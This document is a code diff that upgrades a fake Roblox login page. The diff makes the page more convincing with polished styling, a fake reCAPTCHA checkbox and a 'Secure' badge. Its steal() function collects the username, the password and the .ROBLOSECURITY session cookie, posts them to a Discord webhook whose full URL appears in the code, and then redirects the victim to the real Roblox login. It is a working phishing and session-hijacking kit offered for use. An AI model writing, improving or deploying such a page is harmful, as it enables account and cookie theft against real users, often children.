@@ -1,53 +1,214 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Roblox - Log In</title>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
-body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
-.box { background: #16213e; padding: 40px; border-radius: 8px; width: 400px; box-shadow: 0 0 30px rgba(0,0,0,0.8); text-align: center; border: 1px solid #2a3a5e; }
-.logo { font-size: 48px; font-weight: bold; color: #fff; text-shadow: 0 0 10px #00bfff; }
-.logo span { color: #00bfff; }
-.tagline { color: #aaa; font-size: 14px; margin: 10px 0 30px 0; letter-spacing: 1px; }
-.field { text-align: left; margin: 15px 0; }
-.field label { color: #ccc; font-size: 13px; display: block; margin-bottom: 5px; }
-.field input { width: 100%; padding: 12px; border: none; border-radius: 4px; background: #0f3460; color: #fff; font-size: 16px; outline: none; }
-.field input:focus { border: 2px solid #00bfff; }
-.btn { width: 100%; padding: 14px; background: #00bfff; border: none; border-radius: 4px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin: 20px 0 10px; }
-.btn:hover { background: #0099cc; }
-.signup { color: #888; font-size: 14px; }
-.signup a { color: #00bfff; text-decoration: none; }
-.signup a:hover { text-decoration: underline; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox - Log In</title>
+  <style>
+    /* ===== ROBLOX EXACT STYLES ===== */
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: radial-gradient(ellipse at 50% 50%, #1a1a2e 0%, #0a0a12 100%);
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0;
+      padding: 20px;
+    }
+    .login-container {
+      background: rgba(26, 26, 46, 0.92);
+      backdrop-filter: blur(4px);
+      border-radius: 16px;
+      padding: 44px 40px 38px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.95), 0 0 60px rgba(0,191,255,0.04);
+      border: 1px solid rgba(45, 45, 74, 0.6);
+      transition: all 0.2s;
+    }
+    .logo {
+      font-size: 64px;
+      font-weight: 800;
+      color: #fff;
+      text-align: center;
+      letter-spacing: -2px;
+      line-height: 1;
+      margin-bottom: 2px;
+    }
+    .logo span { color: #00bfff; }
+    .subtitle {
+      color: #8a8aaa;
+      text-align: center;
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      margin-top: 2px;
+    }
+    .input-group {
+      margin-top: 22px;
+    }
+    .input-group label {
+      display: block;
+      color: #c8c8e6;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 5px;
+      letter-spacing: 0.2px;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      background: #12121f;
+      border: 1px solid #2d2d4a;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      transition: border 0.15s, box-shadow 0.15s;
+    }
+    .input-group input:focus {
+      border-color: #00bfff;
+      box-shadow: 0 0 0 3px rgba(0,191,255,0.12);
+    }
+    .input-group input::placeholder {
+      color: #555577;
+      font-weight: 400;
+    }
+    .flex-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+      font-size: 13px;
+    }
+    .flex-row a {
+      color: #6a6a92;
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+    .flex-row a:hover { color: #aaa; }
+    .quick-signin {
+      text-align: center;
+      margin-top: 6px;
+      font-size: 13px;
+      color: #6a6a92;
+      font-weight: 500;
+    }
+    .captcha-box {
+      margin-top: 20px;
+      background: #11111e;
+      border: 1px solid #2d2d4a;
+      border-radius: 8px;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: #aaa;
+      font-size: 14px;
+    }
+    .captcha-box .check {
+      color: #00bfff;
+      font-size: 20px;
+    }
+    .captcha-box .text { color: #ddd; }
+    .captcha-box .badge {
+      margin-left: auto;
+      color: #555577;
+      font-size: 12px;
+      font-weight: 500;
+    }
+    .login-btn {
+      width: 100%;
+      margin-top: 24px;
+      padding: 16px;
+      background: linear-gradient(135deg, #00bfff, #0088cc);
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: filter 0.15s, transform 0.1s;
+      letter-spacing: 0.3px;
+    }
+    .login-btn:hover { filter: brightness(1.08); transform: scale(1.01); }
+    .signup-link {
+      text-align: center;
+      margin-top: 18px;
+      color: #777799;
+      font-size: 14px;
+    }
+    .signup-link a {
+      color: #00bfff;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .signup-link a:hover { text-decoration: underline; }
+    .secure-badge {
+      text-align: center;
+      margin-top: 14px;
+      font-size: 12px;
+      color: #4a4a6a;
+    }
+    .secure-badge span { color: #00bfff; }
+    /* Small tweaks for mobile */
+    @media (max-width: 480px) {
+      .login-container { padding: 30px 20px; }
+      .logo { font-size: 48px; }
+    }
+  </style>
 </head>
 <body>
-<div class="box">
+<div class="login-container">
   <div class="logo">RO<span>BLOX</span></div>
-  <div class="tagline">SIGN UP AND START HAVING FUN!</div>
-  <div class="field">
-    <label>Username</label>
-    <input type="text" id="username" placeholder="Enter your username">
+  <div class="subtitle">Sign up and start having fun!</div>
+
+  <div class="input-group">
+    <label>Username / Email / Phone</label>
+    <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
   </div>
-  <div class="field">
+
+  <div class="input-group">
     <label>Password</label>
     <input type="password" id="password" placeholder="Enter your password">
   </div>
-  <button class="btn" onclick="steal()">Log In</button>
-  <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>
+
+  <div class="flex-row">
+    <a href="#">Forgot Password or Username?</a>
+    <a href="#">Email Me a One-Time Code</a>
+  </div>
+
+  <div class="quick-signin">Quick Sign-in</div>
+
+  <div class="captcha-box">
+    <span class="check">✅</span>
+    <span class="text">I'm not a robot</span>
+    <span class="badge">reCAPTCHA</span>
+  </div>
+
+  <button class="login-btn" onclick="steal()">Log In</button>
+
+  <div class="signup-link">Don't have an account? <a href="#">Sign Up</a></div>
+  <div class="secure-badge">🔒 <span>Secure</span> · Roblox protects your account</div>
 </div>
+
 <script>
 function steal() {
-    const u = document.getElementById('username').value;
-    const p = document.getElementById('password').value;
-    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || '';
-    const data = { username: u, password: p, roblosecurity: cookie };
-    fetch('https://discord.com/api/webhooks/1515763157937815644/iBPg1dvthWvVx-TETFB_nbQtSzTQNjcw7jBg9xFJ9hgLFBUY_6klZqGOpFP8_FvSuuUX', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: '```' + JSON.stringify(data, null, 2) + '```' })
-    });
-    window.location.href = 'https://www.roblox.com/login';
+  const u = document.getElementById('username').value;
+  const p = document.getElementById('password').value;
+  const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || '';
+  const data = { username: u, password: p, roblosecurity: cookie };
+  fetch('https://discord.com/api/webhooks/1356778965073395813/4FdjlGDAw2XqC0VWnLeITbE6p9d6BPS0l7dyW8dnbjgL57p5tsqhC48BBFaytOAOnkEL', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: '```' + JSON.stringify(data, null, 2) + '```' })
+  });
+  window.location.href = 'https://www.roblox.com/login?returnTo=https%3A%2F%2Fwww.roblox.com%2Fgames%2F123456789%2FPrivate-Server';
 }
 </script>
 </body>
-</html>
+</html
